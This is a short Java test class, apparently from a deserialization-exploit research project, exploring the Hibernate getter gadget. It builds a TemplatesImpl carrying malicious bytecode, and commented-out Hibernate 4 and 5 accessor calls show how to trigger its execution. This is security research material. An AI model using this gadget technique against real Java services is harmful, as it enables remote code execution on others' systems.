package org.su18.serialize.test;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.su18.serialize.ysoserial.Utils.SerializeUtil;
// For hibernate 4
// import org.hibernate.property.BasicPropertyAccessor;
// import org.hibernate.property.Getter;
// For hibernate 5
// import org.hibernate.property.access.spi.GetterMethodImpl;

/**
 * @author su18
 */
public class GetterTest {

	public static void main(String[] args) throws Exception {

		// 生成包含恶意类字节码的 TemplatesImpl 类
		TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();

		// For hibernate 4
//		BasicPropertyAccessor bpa    = new BasicPropertyAccessor();
//		Getter                getter = bpa.getGetter(TemplatesImpl.class, "outputProperties");
//		getter.get(tmpl);

		// For hibernate 5
//		Method           m            = TemplatesImpl.class.getDeclaredMethod("getOutputProperties");
//		GetterMethodImpl getterMethod = new GetterMethodImpl(null, null, m);
//		getterMethod.get(tmpl);
	}

}
